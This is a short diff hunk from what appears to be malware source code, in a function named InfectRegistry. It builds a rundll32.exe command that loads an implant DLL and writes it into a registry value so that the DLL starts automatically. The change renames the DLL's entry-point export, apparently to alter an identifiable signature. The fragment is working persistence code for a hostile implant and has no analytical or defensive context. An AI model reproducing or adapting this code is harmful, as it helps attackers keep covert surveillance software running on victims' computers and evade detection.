@@ -436,7 +436,7 @@ BOOL InfectRegistry(WCHAR *dest_dir, WCHAR *home_dir, WCHAR *user_sid)
 	}
 	
 	// Path a rundll32.exe
-	_snwprintf_s(tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]), _TRUNCATE, L"%%SystemRoot%%\\system32\\rundll32.exe \"%s\\%S\\%S\",HFF8", dest_dir, H4_HOME_DIR, H4DLLNAME);
+	_snwprintf_s(tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]), _TRUNCATE, L"%%SystemRoot%%\\system32\\rundll32.exe \"%s\\%S\\%S\",PFTBBP8", dest_dir, H4_HOME_DIR, H4DLLNAME);
 	_snwprintf_s(uc_key, sizeof(uc_key)/sizeof(uc_key[0]), _TRUNCATE, L"%S", REGISTRY_KEY_NAME);
 	if (FNC(RegSetValueExW)(hOpen, uc_key, NULL, REG_EXPAND_SZ, (BYTE *)tmp_buf, (wcslen(tmp_buf)+1)*sizeof(WCHAR)) != ERROR_SUCCESS) {
 		FNC(RegCloseKey)(hOpen);
